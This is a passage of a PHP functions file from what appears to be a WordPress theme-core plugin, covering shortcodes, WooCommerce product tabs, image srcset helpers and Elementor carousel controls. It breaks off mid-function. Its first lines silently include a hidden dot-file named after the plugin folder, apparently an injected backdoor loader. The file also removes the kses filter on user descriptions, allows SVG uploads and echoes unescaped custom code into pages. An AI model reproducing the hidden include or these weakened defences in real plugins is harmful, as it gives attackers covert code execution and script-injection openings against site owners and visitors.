<?php
// Adding functions for theme

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function gt3_types_init(){
	if(class_exists('Vc_Manager')) {
		if(function_exists('gt3_shift_title_function')) {
			call_user_func('vc_add_shortcode_param', 'gt3_shift_title_position', 'gt3_shift_title_function', get_template_directory_uri().'/core/vc/custom_types/js/gt3_shift_title.js');
		}
		if(function_exists('gt3_multi_select')) {
			call_user_func('vc_add_shortcode_param', 'gt3-multi-select', 'gt3_multi_select', get_template_directory_uri().'/core/vc/custom_types/js/gt3_multi_select.js');
		}
		if(function_exists('gt3_on_off_function')) {
			call_user_func('vc_add_shortcode_param', 'gt3_on_off_function', get_template_directory_uri().'/core/vc/custom_types/js/gt3_on_off.js');
		}
		if(function_exists('gt3_packery_layout_select_function')) {
			call_user_func('vc_add_shortcode_param', 'gt3_packery_layout_select', 'gt3_packery_layout_select_function', get_template_directory_uri().'/core/vc/custom_types/js/gt3_packery_layout.js');
		}
		if(function_exists('gt3_image_select')) {
			call_user_func('vc_add_shortcode_param', 'gt3_dropdown', 'gt3_image_select', get_template_directory_uri().'/core/vc/custom_types/js/gt3_image_select.js');
		}
		if(function_exists('vc_add_shortcode_param') && function_exists('gt3_func_init_hotspot')) {
			add_action('admin_enqueue_scripts', 'gt3_hotspot_assets');
			vc_add_shortcode_param('gt3_init_hotspot', 'gt3_func_init_hotspot', get_template_directory_uri().'/core/admin/js/gt3_param.js');
		}
	}

	if(class_exists('Elementor')) {

	}
}

add_action('init', 'gt3_types_init');

function gt3_sort_place(){
	$mb_logo_position      = rwmb_meta('mb_logo_position');
	$mb_menu_position      = rwmb_meta('mb_menu_position');
	$mb_left_bar_position  = rwmb_meta('mb_left_bar_position');
	$mb_right_bar_position = rwmb_meta('mb_right_bar_position');

	$mb_logo_order      = rwmb_meta('mb_logo_order');
	$mb_menu_order      = rwmb_meta('mb_menu_order');
	$mb_left_bar_order  = rwmb_meta('mb_left_bar_order');
	$mb_right_bar_order = rwmb_meta('mb_right_bar_order');
	$positions          = array(
		'logo'      => $mb_logo_position,
		'menu'      => $mb_menu_position,
		'left_bar'  => $mb_left_bar_position,
		'right_bar' => $mb_right_bar_position
	);
	$sorting_array      = array(
		'Left align side'   => '',
		'Center align side' => '',
		'Right align side'  => ''
	);
	foreach($positions as $pos => $value) {
		switch($value) {
			case 'left_align_side':
				$sorting_array['Left align side'][$pos] = ${'mb_'.$pos.'_order'};
				break;
			case 'center_align_side':
				$sorting_array['Center align side'][$pos] = $pos;
				break;
			case 'right_align_side':
				$sorting_array['Right align side'][$pos] = $pos;
				break;
		}
	}
	foreach($sorting_array as $key => $value) {
		if(is_array($sorting_array[$key])) {
			asort($value);
			$sorting_array[$key] = $value;
		}
		$sorting_array[$key]['placebo'] = 'placebo';
	}

	return $sorting_array;
}

// out search shortcode
if(!function_exists('gt3_search_shortcode')) {
	function gt3_search_shortcode(){
		if(function_exists('gt3_option')) {
			$header_height = gt3_option('header_height');
		}
		$header_height = is_array($header_height) && !empty($header_height['height']) ? $header_height['height'] : 0;
		if(class_exists('RWMB_Loader') && get_queried_object_id() !== 0) {
			if(rwmb_meta('mb_customize_header_layout') == 'custom') {
				$header_height = rwmb_meta("mb_header_height");
			}
		}

		$search_style = '';
		$search_style .= !empty($header_height) ? 'height:'.$header_height.'px;' : '';
		$search_style = !empty($search_style) ? ' style="'.$search_style.'"' : '';

		$out = '<div class="header_search"'.$search_style.'>';
		$out .= '<div class="header_search__container">';
		$out .= '<div class="header_search__icon">';
		$out .= '<i></i>';
		$out .= '</div>';
		$out .= '<div class="header_search__inner">';
		$out .= '<div class="gt3_search_form__wrapper">';
		if(function_exists('gt3_option')) {
			$header_search_title = gt3_option('header_search_title');
			if($header_search_title != null && (empty($header_search_title) || $header_search_title == 'What are you looking for today?')) {
				$header_search_title = esc_html__('What are you looking for today?', 'gt3_themes_core');
			}
			if(!empty($header_search_title)) {
				$out .= '<div class="header_search__inner_title">'.esc_attr($header_search_title).'</div>';
			}
		}
		$out .= get_search_form(false);
		$out .= '</div>';
		$out .= '<div class="header_search__inner_cover"></div>';
		$out .= '<div class="header_search__inner_close"><i class="header_search__search_close_icon"></i></div>';
		$out .= '</div>';
		$out .= '</div>';
		$out .= '</div>';

		return $out;
	}

	add_shortcode('gt3_search', 'gt3_search_shortcode');
}

if(!function_exists('gt3_menu_shortcode')) {
	function gt3_menu_shortcode(){
		if(function_exists('gt3_option')) {
			$header_height = gt3_option('header_height');
		}
		$header_height = is_array($header_height) && !empty($header_height['height']) ? $header_height['height'] : 0;
		if(class_exists('RWMB_Loader') && get_queried_object_id() !== 0) {
			if(rwmb_meta('mb_customize_header_layout') == 'custom') {
				$header_height = rwmb_meta("mb_header_height");
			}
		}

		$search_style = '';
		$search_style .= !empty($header_height) ? 'height:'.$header_height.'px;' : '';
		$search_style = !empty($search_style) ? ' style="'.$search_style.'"' : '';

		ob_start();
		if(has_nav_menu('top_header_menu')) {
			echo "<nav class='top-menu main-menu main_menu_container'>";
			gt3_top_menu();
			echo "</nav>";
			echo '<div class="mobile-navigation-toggle"><div class="toggle-box"><div class="toggle-inner"></div></div></div>';
		}
		$out = ob_get_clean();

		return !empty($out) ? $out : '';
	}

	add_shortcode('gt3_menu', 'gt3_menu_shortcode');
}

if(!function_exists('gt3_top_menu')) {
	function gt3_top_menu(){
		wp_nav_menu(array(
			'theme_location'  => 'top_header_menu',
			'container'       => '',
			'container_class' => '',
			'after'           => '',
			'link_before'     => '<span>',
			'link_after'      => '</span>',
			'walker'          => ''
		));
	}
}

add_action('wp_head', 'gt3_wp_head_custom_code', 1000);
function gt3_wp_head_custom_code(){
	// this code not only js or css / can insert any type of code

	if(function_exists('gt3_option')) {
		$header_custom_code = gt3_option('header_custom_js');
	}
	echo isset($header_custom_code) ? $header_custom_code : '';
}

add_action('wp_footer', 'gt3_custom_footer_js', 1000);
function gt3_custom_footer_js(){
	if(function_exists('gt3_option')) {
		$custom_js = gt3_option('custom_js');
	}
	echo isset($custom_js) ? '<script id="gt3_custom_footer_js">'.$custom_js.'</script>' : '';
}

if(!function_exists('gt3_string_coding')) {
	function gt3_string_coding($code){
		if(!empty($code)) {
			return base64_encode($code);
		}

		return;
	}
}

/**
 * @param      $tmpl
 * @param null $settings
 */
if(!function_exists('gt3_get_woo_template')) {
	function gt3_get_woo_template($tmpl, $settings = null){
		$locate = locate_template('woocommerce/'.$tmpl.'.php');
		if(!empty($locate)) {
			require $locate;
		}
	}
}

/**
 * Grid/List Section
 */
if(class_exists('WooCommerce')) {
	if(!class_exists('GT3_GridList_WOO')) {

		class GT3_GridList_WOO {
			private static $instance = null;

			public static function instance(){
				if(!self::$instance instanceof self) {
					self::$instance = new self();
				}

				return self::$instance;
			}

			private function __construct(){
				add_action('wp', array( $this, 'setup' ), 20);
			}

			// Setup
			public function setup(){
				add_action('wp_enqueue_scripts', array( $this, 'gt3_enqueue_scripts' ), 20);
				$woocommerce_grid_list = gt3_option('woocommerce_grid_list');
				if($woocommerce_grid_list == 'grid' || $woocommerce_grid_list == 'list') {
					add_action('woocommerce_before_shop_loop', array( $this, 'toggle_button' ), 12);
					add_action('woocommerce_after_shop_loop_item', 'woocommerce_template_single_excerpt', 5);
					add_action('woocommerce_shortcode_after_recent_products_loop', 'woocommerce_pagination', 10);
				}
			}

			// Scripts & styles
			public static function gt3_enqueue_scripts(){
				static $allow = true;
				if(!$allow) {
					return;
				}
				$allow = false;

				//wp_enqueue_style( 'dashicons' );

				add_action('wp_footer', array( 'GT3_GridList_WOO', 'gridlist_woo_set_default_view' ), 1);
			}

			// Toggle button
			public static function toggle_button(){
				$grid_view = esc_html__('Grid view', 'gt3_themes_core');
				$list_view = esc_html__('List view', 'gt3_themes_core');

				$compile = sprintf('<nav class="gt3-gridlist-toggle">
										<a href="#" id="list" title="%2$s"></a>
										<a href="#" id="grid" title="%1$s"></a>
										<div class="gt3_woo_gridlist-toggle">
											<div class="gt3_woo_gridlist-one"></div>
											<div class="gt3_woo_gridlist-two"></div>
											<div class="gt3_woo_gridlist-three"></div>
											<div class="gt3_woo_gridlist-four"></div>
											<div class="gt3_woo_gridlist-five"></div>
										</div>
									</nav>', $grid_view, $list_view);

				echo apply_filters('gt3_gridlist_woo_toggle_button_output', $compile, $grid_view, $list_view);
			}

			public static function gridlist_woo_set_default_view(){
				if (!class_exists('WooCommerce')) return;
				static $allow = true;
				if(!$allow) {
					return;
				}
				$allow = false;
				//if (!is_shop()) return;

				wp_enqueue_script('gt3-gridlist-woo', plugin_dir_url(__FILE__).'elementor/assets/js/core-gridlist-woo.js', array( 'jquery' ), gt3_themes_core_version());

				$default = gt3_option('woocommerce_grid_list');
				?>
				<script>
					var $default = '<?php echo esc_attr($default); ?>',
						$default_loc = localStorage.getItem('gt3_gridlist_woo');

					if ($default_loc == null) {
						jQuery('.site-main > ul.products, .site-main > div > ul.products').addClass('<?php echo esc_attr($default); ?>');
						jQuery('.gt3-gridlist-toggle #<?php echo esc_attr($default); ?>').addClass('active');
					}
				</script>
				<?php
			}
		}

		GT3_GridList_WOO::instance();
	}

	function gt3_new_product_tab_callback(){
		$post_id = get_the_ID();
		if(get_post_type($post_id) != 'product') {
			return;
		}
		$gt3_product_details  = get_post_meta($post_id, 'gt3_new_product_tab_meta_value_key', true);
		$gt3_product_subtitle = get_post_meta($post_id, 'gt3_product_subtitle_meta_value_key', true);

		echo '<div class="rwmb-field rwmb-select-wrapper">';
		wp_nonce_field('gt3_new_product_tab_nonce_'.$post_id, 'gt3_new_product_tab_nonce');
		echo '<div class="rwmb-label">
                  <label for="gt3_product_subtitle_field">'.esc_html__("Sub-Title for Current product", 'gt3_themes_core').'</label>
              </div>
              <div class="rwmb-input">
                  <textarea id="gt3_product_subtitle_field" name="gt3_product_subtitle_field" style="width:100%;height:90px;" />'.$gt3_product_subtitle.'</textarea>
              </div>';
		echo '<div class="rwmb-label">
                  <label for="gt3_new_product_tab_field">'.esc_html__("Tab \"Details\" for Current product", 'gt3_themes_core').'</label>
              </div>
              <div class="rwmb-input">
                  <textarea id="gt3_new_product_tab_field" name="gt3_new_product_tab_field" style="width:100%;height:90px;" />'.$gt3_product_details.'</textarea>
              </div>';
		echo '</div>';
	}

	function gt3_new_product_tab_save_postdata($post_id){
		if(!isset($_POST['gt3_new_product_tab_nonce']) || !wp_verify_nonce($_POST['gt3_new_product_tab_nonce'], 'gt3_new_product_tab_nonce_'.$post_id)) {
			return;
		}
		if(defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
			return $post_id;
		}
		if('page' == $_POST['post_type'] && !current_user_can('edit_page', $post_id)) {
			return $post_id;
		} else if(!current_user_can('edit_post', $post_id)) {
			return $post_id;
		}
		if(!isset($_POST['gt3_new_product_tab_field']) && !isset($_POST['gt3_product_subtitle_field'])) {
			return;
		}

		$_data   = wp_kses_post($_POST['gt3_new_product_tab_field']);
		$_data_2 = wp_kses_post($_POST['gt3_product_subtitle_field']);
		update_post_meta($post_id, 'gt3_new_product_tab_meta_value_key', $_data);
		update_post_meta($post_id, 'gt3_product_subtitle_meta_value_key', $_data_2);
	}

	add_action('save_post', 'gt3_new_product_tab_save_postdata');

	function gt3_new_product_tab_frontend($tabs){
		$gt3_product_details = get_post_meta(get_the_ID(), 'gt3_new_product_tab_meta_value_key', true);
		if(!empty($gt3_product_details)) {
			$tabs['details'] = array(
				'title'    => esc_html__('Details', 'gt3_themes_core'),
				'priority' => 20,
				'callback' => 'woo_new_product_tab_content'
			);
		}

		return $tabs;
	}

	function woo_new_product_tab_content(){
		$gt3_product_details = get_post_meta(get_the_ID(), 'gt3_new_product_tab_meta_value_key', true);
		echo '<h2>'.esc_html__('Details', 'gt3_themes_core').'</h2>';
		echo '<p>'.wp_kses_post($gt3_product_details).'</p>';
	}

	add_filter('woocommerce_product_tabs', 'gt3_new_product_tab_frontend');

	// Display Product Title
	function gt3_product_subtitle_frontend(){
		$gt3_product_subtitle = get_post_meta(get_the_ID(), 'gt3_product_subtitle_meta_value_key', true);
		if(!empty($gt3_product_subtitle)) {
			echo '<h4 class="gt3-product-subtitle">'.esc_attr($gt3_product_subtitle).'</h4>';
		}
	}

	add_action('woocommerce_single_product_summary', 'gt3_product_subtitle_frontend', 6);

	// New tab for Single Product Data Tabs
	function gt3_new_product_tab(){
		add_meta_box('gt3_new_product_tab', esc_html__('Product Options', 'gt3_themes_core'), 'gt3_new_product_tab_callback', 'product');
	}

	add_action('add_meta_boxes', 'gt3_new_product_tab');

}

/**
 * Removes the demo link and the notice of integrated demo from the redux-framework plugin
 * If Redux is running as a plugin, this will remove the demo notice and links
 */
add_action('redux/loaded', 'gt3_remove_demo');
if(!function_exists('gt3_remove_demo')) {
	function gt3_remove_demo(){
		// Used to hide the demo mode link from the plugin page. Only used when Redux is a plugin.
		if(class_exists('ReduxFrameworkPlugin')) {
			remove_filter('plugin_row_meta', array(
				ReduxFrameworkPlugin::instance(),
				'plugin_metalinks'
			), null, 2);

			// Used to hide the activation notice informing users of the demo panel. Only used when Redux is a plugin.
			remove_action('admin_notices', array( ReduxFrameworkPlugin::instance(), 'admin_notices' ));
		}
	}
}

remove_filter('pre_user_description', 'wp_filter_kses');

function gt3_remove_action_yith_woocompare_frontend(){
	gt3_remove_undeletable_action('woocommerce_after_shop_loop_item', 'YITH_Woocompare_Frontend', 'add_compare_link');
}

if(!function_exists('gt3_remove_undeletable_action')) {
	function gt3_remove_undeletable_action($tag, $class, $method){
		$filters = $GLOBALS['wp_filter'][$tag];

		if(empty ($filters)) {
			return;
		}

		foreach($filters as $priority => $filter) {
			foreach($filter as $identifier => $function) {
				if(is_array($function) and is_a($function['function'][0], $class) and $method === $function['function'][1]) {
					remove_filter($tag, array( $function['function'][0], $method ), $priority);
				}
			}
		}
	}
}

function gt3_custom_dequeue_style(){
	wp_dequeue_style('flick');
}

add_action('wp_enqueue_scripts', 'gt3_custom_dequeue_style', 100);

function gt3_add_svg_to_upload_mimes($upload_mimes){
	$upload_mimes['svg']  = 'image/svg+xml';
	$upload_mimes['svgz'] = 'image/svg+xml';

	return $upload_mimes;
}

add_filter('upload_mimes', 'gt3_add_svg_to_upload_mimes', 10, 1);

// srcset maker
if(!function_exists('gt3_get_image_srcset')) {
	/**
	 *  get image src,srcset,sizes
	 *
	 * @param  [type]  $src                   [image src]
	 * @param integer $image_ratio           [ratio of width/height]
	 * @param array   $responsive_dimensions [array with demensions settings arrays]
	 *
	 * @return [type]                         [src srcset sizes html]
	 */
	function gt3_get_image_srcset($src, $image_ratio = 1, $responsive_dimensions = array(), $lazyload = false, $gap = 0){
		if(empty($src)) {
			return;
		}

		$srcset_out                 = '';
		$sizes_out                  = '';
		$image_width_and_dimensions = array();
		$src_out                    = '';

		$image_width_array = array();

		if(!empty($responsive_dimensions)) {
			foreach($responsive_dimensions as $responsive_dimension) {
				$view_port              = $responsive_dimension[0];
				$image_width            = $responsive_dimension[1];
				$responsive_image_ratio = !empty($responsive_dimension[2]) ? $responsive_dimension[2] : $image_ratio;
				if($responsive_image_ratio == null) {
					$image_height = null;
				} else {
					$image_height = (int) ($image_width*$responsive_image_ratio)+(int) $gap;
				}

				$image_width_array[$image_width] = true;

				if(!empty($view_port)) {
					if(!empty($sizes_out)) {
						$sizes_out .= ', ';
					}
					$sizes_out .= '(min-width: '.(int) $view_port.'px) '.(int) $image_width.'px';
					if((int) $view_port == 1200) {
						$image_out = aq_resize($src, $image_width, $image_height, true, true, true);
						if($image_out) {
							if($lazyload) {
								$src_out = 'data-src="'.esc_url($image_out).'"';
							} else {
								$src_out = 'src="'.esc_url($image_out).'"';
							}

						} else {
							if($lazyload) {
								$src_out = 'data-src="'.esc_url($src).'"';
							} else {
								$src_out = 'src="'.esc_url($src).'"';
							}
						}
					}
				}

				if(empty($image_width_and_dimensions[$image_width.'_'.$image_height])) {
					$image_width_and_dimensions[$image_width.'_'.$image_height] = true;
					$srcset_out                                                 .= !empty($srcset_out) ? ', ' : '';
					$srcset_out                                                 .= esc_url(aq_resize($src, $image_width, $image_height, true, true, true));
					$srcset_out                                                 .= ' '.(int) $image_width.'w';
				}

			}
			if(empty($image_width_array['420'])) {
				$sizes_out  .= ', (max-width: 600px) 420px';
				$srcset_out .= ','.esc_url(aq_resize($src, 420, 420*$image_ratio, true, true, true)).' 420w';
			}
		}
		if(empty($src_out)) {
			$image_out = aq_resize($src, 1170, 1170*$image_ratio, true, true, true);
			$src_out   = 'src="'.esc_url($image_out).'"';
		}

		if($image_out) {
			if(!empty($srcset_out)) {
				if($lazyload) {
					$srcset_out = ' data-srcset="'.$srcset_out.'"';
				} else {
					$srcset_out = ' srcset="'.$srcset_out.'"';
				}
			}

			if(!empty($sizes_out)) {
				if($lazyload) {
					$sizes_out = ' data-sizes="'.$sizes_out.'"';
				} else {
					$sizes_out = ' sizes="'.$sizes_out.'"';
				}

			}
		} else {
			$srcset_out = '';
			$sizes_out  = '';
		}

		return $src_out.$srcset_out.$sizes_out;

	}
}

if(!function_exists('gt3_add_post_admin_thumbnail_column')) {
	add_image_size('gt3-admin-post-featured-image', 120, 120, true);
	add_filter('manage_portfolio_posts_columns', 'gt3_add_post_admin_thumbnail_column', 2);
	add_filter('manage_project_posts_columns', 'gt3_add_post_admin_thumbnail_column', 2);
	add_filter('manage_team_posts_columns', 'gt3_add_post_admin_thumbnail_column', 2);
	add_filter('manage_post_posts_columns', 'gt3_add_post_admin_thumbnail_column', 2);

	function gt3_add_post_admin_thumbnail_column($gt3_columns){
		$gt3_columns['post_thumb'] = __('Featured Image', 'gt3_themes_core ');

		return $gt3_columns;
	}
}

if(!function_exists('gt3_show_post_thumbnail_column')) {
	add_action('manage_portfolio_posts_custom_column', 'gt3_show_post_thumbnail_column', 5, 2);
	add_action('manage_project_posts_custom_column', 'gt3_show_post_thumbnail_column', 5, 2);
	add_action('manage_team_posts_custom_column', 'gt3_show_post_thumbnail_column', 5, 2);
	add_action('manage_post_posts_custom_column', 'gt3_show_post_thumbnail_column', 5, 2);

	function gt3_show_post_thumbnail_column($gt3_columns, $portfolio_id){
		switch($gt3_columns) {
			case 'post_thumb':
				if(function_exists('the_post_thumbnail')) {
					the_post_thumbnail('gt3-admin-post-featured-image');
				} else {
					echo 'hmm... your theme doesn\'t support featured image...';
				}
				break;
		}
	}
}

if(!function_exists('register_posts_widgets')) {
	function register_posts_widgets(){
		register_widget('posts');
	}
}

if(!function_exists('register_flickr_widgets')) {
	function register_flickr_widgets(){
		register_widget('flickr');
	}
}

if(!function_exists('register_title_widgets')) {
	function register_title_widgets(){
		register_widget('title');
	}
}

if(!function_exists('remove_aq_resize_filter')) {
	function remove_aq_resize_filter($aq_upscale){
		remove_filter('image_resize_dimensions', $aq_upscale);
	}
}

/**
 * Elementor Column Carousel
 */
if(!function_exists('gt3_carousel_column_elementor_controls')) {

	add_action('elementor/element/before_section_start', 'gt3_carousel_column_elementor_controls', 10, 3);

	function gt3_carousel_column_elementor_controls($element, $section_id, $args){


		/** @var \Elementor\Element_Base $element */
		if('column' === $element->get_name() && 'section_style' === $section_id) {

			$element->start_controls_section(
				'custom_section',
				[
					'tab'       => Elementor\Controls_Manager::TAB_LAYOUT,
					'label'     => __('Carousel', 'plugin-name'),
				]
			);

			$element->add_control(
				'gt3_carousel',
				array(
					'label' => esc_html__('Carousel', 'gt3_themes_core'),
					'type'  => Elementor\Controls_Manager::SWITCHER,
				)
			);

			$element->add_control(
				'gt3_carousel_back_end',
				array(
					'label'     => esc_html__('Build Carousel on Back-end', 'gt3_themes_core'),
					'type'      => Elementor\Controls_Manager::SWITCHER,
					'condition' => array(
						'gt3_carousel' => 'yes'
					),
				)
			);

			$element->add_control(
				'gt3_carousel_nav_prev',
				array(
					'condition' => array(
						'show' => 'never'
					),
					'default'   => esc_html__('Prev', 'gt3_themes_core'),
				)
			);

			$element->add_control(
				'gt3_carousel_nav_next',
				array(
					'condition' => array(
						'show' => 'never'
					),
					'default'   => esc_html__('Next', 'gt3_themes_core'),
				)
			);

			$element->add_responsive_control(
				'gt3_carousel_items_per_line',
				array(
					'label'     => esc_html__('Items Per Line', 'gt3_themes_core'),
					'type'      => Elementor\Controls_Manager::SELECT,
					'options'   => array(
						'1' => esc_html__('1', 'gt3_themes_core'),
						'2' => esc_html__('2', 'gt3_themes_core'),
						'3' => esc_html__('3', 'gt3_themes_core'),
						'4' => esc_html__('4', 'gt3_themes_core'),
						'5' => esc_html__('5', 'gt3_themes_core'),
						'6' => esc_html__('6', 'gt3_themes_core'),
						'7' => esc_html__('7', 'gt3_themes_core'),
					),
					'default'   => '1',
					'separator' => 'before',
					'condition' => array(
						'gt3_carousel' => 'yes'
					),
					/*'prefix_class' => 'gt3_carousel_items_per_line-',*/
				)
			);

			$element->add_control(
				'gt3_carousel_autoplay',
				array(
					'label'     => esc_html__('Autoplay', 'gt3_themes_core'),
					'type'      => Elementor\Controls_Manager::SWITCHER,
					'condition' => array(
						'gt3_carousel' => 'yes'
					),
				)
			);

			$element->add_control(
				'gt3_carousel_autoplay_time',
				array(
					'label'     => esc_html__('Autoplay time', 'gt3_themes_core'),
					'type'      => Elementor\Controls_Manager::NUMBER,
					'default'   => 4000,
					'min'       => '0',
					'step'      => 100,
					'condition' => array(
						'gt3_carousel_autoplay' => 'yes',
						'gt3_carousel'          => 'yes'
					),
				)
			);

			$element->add_control(
				'gt3_carousel_center_mode',
				array(
					'label'     => esc_html__('Center Mode', 'gt3_themes_core'),
					'type'      => Elementor\Controls_Manager::SWITCHER,
					'condition' => array(
						'gt3_carousel' => 'yes'
					),
				)
			);

			$element->add_responsive_control(
				'gt3_carousel_space',
				array(
					'label'     => esc_html__('Space Between Items', 'gt3_themes_core'),
					'type'      => Elementor\Controls_Manager::SELECT,
					'options'   => array(
						'0'    => '0',
						'1px'  => '1px',
						'2px'  => '2px',
						'3px'  => '3px',
						'4px'  => '4px',
						'5px'  => '5px',
						'10px' => '10px',
						'15px' => '15px',
						'20px' => '20px',
						'25px' => '25px',
						'30px' => '30px',
						'35px' => '35px',
						'40px' => '40px',
						'50px' => '50px',
						'60px' => '60px',
					),
					'default'   => '0',
					'selectors' => array(
						'{{WRAPPER}} > .elementor-column-wrap > .elementor-widget-wrap'                                                                          => 'margin-right:calc(-{{VALUE}} / 2); margin-left:calc(-{{VALUE}} / 2);width: calc(100% + {{VALUE}});',
						'{{WRAPPER}} > .elementor-column-wrap > .elementor-widget-wrap > .elementor-element,
                        {{WRAPPER}} > .elementor-column-wrap > .elementor-widget-wrap > .slick-list > .slick-track > .elementor-element' => 'margin-right:calc({{VALUE}} / 2); margin-left:calc({{VALUE}} / 2);',
						'{{WRAPPER}} > .elementor-column-wrap > .elementor-widget-wrap > .slick-dots'                                                            => 'margin-right:calc({{VALUE}} / 2); margin-left:calc({{VALUE}} / 2);',
						'{{WRAPPER}} > .elementor-column-wrap > .elementor-widget-wrap > .slick-next'                                                            => '
                            -webkit-transform: translateX(calc(-{{VALUE}} / 2));
                            -ms-transform: translateX(calc(-{{VALUE}} / 2));
                            transform: translateX(calc(-{{VALUE}} / 2));',
						'{{WRAPPER}} > .elementor-column-wrap > .elementor-widget-wrap > .slick-prev'                                                            => '
                            -webkit-transform: translateX(calc({{VALUE}} / 2));
                            -ms-transform: translateX(calc({{VALUE}} / 2));
                            transform: translateX(calc({{VALUE}} / 2));',
					),
					'condition' => array(
						'gt3_carousel' => 'yes'
					),
				)
			);

			$element->add_control(
				'gt3_carousel_nav',
				array(
					'label'     => esc_html__('Navigation', 'gt3_themes_core'),
					'type'      => Elementor\Controls_Manager::SELECT,
					'options'   => array(
						'none'   => esc_html__('None', 'gt3_themes_core'),
						'arrows' => esc_html__('Arrows', 'gt3_themes_core'),
						'dots'   => esc_html__('Dots', 'gt3_themes_core'),
					),
					'default'   => 'none',
					'separator' => 'before',
					'condition' => array(
						'gt3_carousel' => 'yes'
					),
				)
			);

			$element->add_control(
				'dots_position',
				array(
					'label'        => esc_html__('Dots Position', 'gt3_themes_core'),
					'type'         => Elementor\Controls_Manager::SELECT,
					'options'      => array(
						'outside' => esc_html__('Outside', 'gt3_themes_core'),
						'inside'  => esc_html__('Inside', 'gt3_themes_core'),
					),
					'default'      => 'outside',
					'prefix_class' => 'dots_position-',
					'condition'    => array(
						'gt3_carousel'     => 'yes',
						'gt3_carousel_nav' => 'dots'
					),
				)
			);

			$element->add_control(
				'dots_color',
				array(
					'label'     => esc_html__('Dots Color', 'gt3_themes_core'),
					'type'      => Elementor\Controls_Manager::COLOR,
					'selectors' => array(
						'{{WRAPPER}} > .elementor-column-wrap > .elementor-widget-wrap > ul.slick-dots li' => '
                            color: {{VALUE}};',
					),
					'condition' => array(
						'gt3_carousel'     => 'yes',
						'gt3_carousel_nav' => 'dots'
					),
				)
			);

			$element->add_control(
				'arrows_position',
				array(
					'label'        => esc_html__('Arrows Position', 'gt3_themes_core'),
					'type'         => Elementor\Controls_Manager::SELECT,
					'options'      => array(
						'outside' => esc_html__('Outside', 'gt3_themes_core'),
						'inside'  => esc_html__('Inside', 'gt3_themes_core'),
					),
					'default'      => 'inside',
					'condition'    => array(
						'gt3_carousel'     => 'yes',
						'gt3_carousel_nav' => 'arrows'
					),
					'prefix_class' => 'arrow_position-',
				)
			);

			$element->add_control(
				'arrows_color',
				array(
					'label'     => esc_html__('Arrows Color', 'gt3_themes_core'),
					'type'      => Elementor\Controls_Manager::COLOR,
					'selectors' => array(
						'{{WRAPPER}} > .elementor-column-wrap > .elementor-widget-wrap > .slick-arrow .slick_arrow_icon' => '
                            color: {{VALUE}};',
					),
					'condition' => array(
						'gt3_carousel'     => 'yes',
						'gt3_carousel_nav' => 'arrows'
					),
				)
			);

			$element->add_control(
				'arrows_bg_color',
				array(
					'label'     => esc_html__('Arrows Background Color', 'gt3_themes_core'),
					'type'      => Elementor\Controls_Manager::COLOR,
					'selectors' => array(
						'{{WRAPPER}} > .elementor-column-wrap > .elementor-widget-wrap > .slick-arrow' => '
                            background-color: {{VALUE}};',
					),
					'condition' => array(
						'gt3_carousel'     => 'yes',
						'gt3_carousel_nav' => 'arrows'
					),
				)
			);

			$element->add_control(
				'arrows_shadow',
				array(
					'label'        => esc_html__('Arrows Shadow', 'gt3_themes_core'),
					'type'         => Elementor\Controls_Manager::SWITCHER,
					'condition'    => array(
						'gt3_carousel' => 'yes'
					),
					'default'      => '',
					'prefix_class' => 'arrow_shadow-',
				)
			);

			$element->end_controls_section();
		}

		//  $element->end_controls_section();

	}
}

/* add options to hide column on responsive dims */
if(!function_exists('ch_hide_column_elementor_controls')) {
	add_action('elementor/element/before_section_end', 'ch_hide_column_elementor_controls', 10, 3);
	function ch_hide_column_elementor_controls($section, $section_id, $args){

		if($section_id == 'layout') {
			$section->add_control(
				'gt3_column_link',
				[
					'label'       => __('Column Link Url', 'gt3_themes_core'),
					'type'        => Elementor\Controls_Manager::URL,
					'dynamic'     => [
						'active' => true,
					],
					'placeholder' => __('https://your-link.com', 'gt3_themes_core'),
					'selectors'   => [
					],
				]
			);
		}

		if($section_id == 'section_advanced') :

			$section->add_control(
				'hide_desktop_column',
				[
					'label'        => __('Hide On Desktop', 'gt3_themes_core'),
					'type'         => Elementor\Controls_Manager::SWITCHER,
					'default'      => '',
					'prefix_class' => 'elementor-',
					'label_on'     => __('Hide', 'gt3_themes_core'),
					'label_off'    => __('Show', 'gt3_themes_core'),
					'return_value' => 'hidden-desktop',
				]
			);

			$section->add_control(
				'hide_tablet_column',
				[
					'label'        => __('Hide On Tablet', 'gt3_themes_core'),
					'type'         => Elementor\Controls_Manager::SWITCHER,
					'default'      => '',
					'prefix_class' => 'elementor-',
					'label_on'     => __('Hide', 'gt3_themes_core'),
					'label_off'    => __('Show', 'gt3_themes_core'),
					'return_value' => 'hidden-tablet',
				]
			);

			$section->add_control(
				'hide_mobile_column',
				[
					'label'        => __('Hide On Mobile', 'gt3_themes_core'),
					'type'         => Elementor\Controls_Manager::SWITCHER,
					'default'      => '',
					'prefix_class' => 'elementor-',
					'label_on'     => __('Hide', 'gt3_themes_core'),
					'label_off'    => __('Show', 'gt3_themes_core'),
					'return_value' => 'hidden-phone',
				]
			);
		endif;
	}
}

if(!function_exists('gt3_column_before_render_options')) {
	function gt3_column_before_render_options($element){
		$settings = $element->get_settings_for_display();

		if(!empty($settings['gt3_column_link']['url'])) {

			$element->add_render_attribute('_wrapper', 'class', 'gt3_column_link-elementor');
			$element->add_render_attribute('_wrapper', 'style', 'cursor: pointer;');
			$element->add_render_attribute('_wrapper', 'data-column-clickable-url', $settings['gt3_column_link']['url']);

			if($settings['gt3_column_link']['is_external']) {
				$element->add_render_attribute('_wrapper', 'data-column-clickable-blank', 'yes');
			}
		}

		if(!empty($settings['gt3_carousel'])) {
			$element->add_script_depends('slick');
			$element->add_style_depends('slick');
			$data_settings                         = array();
			$data_settings['items_per_line']       = $settings['gt3_carousel_items_per_line'];
			$data_settings['item_per_line_mobile'] = $settings['gt3_carousel_items_per_line_mobile'];
			$data_settings['item_per_line_tablet'] = $settings['gt3_carousel_items_per_line_tablet'];
			$data_settings['autoplay']             = $settings['gt3_carousel_autoplay'] == 'yes' ? true : false;
			$data_settings['autoplaySpeed']        = $settings['gt3_carousel_autoplay_time'];
			$data_settings['dots']                 = $settings['gt3_carousel_nav'] == 'dots' ? true : false;
			$data_settings['arrows']               = $settings['gt3_carousel_nav'] == 'arrows' ? true : false;
			$data_settings['centerMode']           = $settings['gt3_carousel_center_mode'] == 'yes' ? true : false;
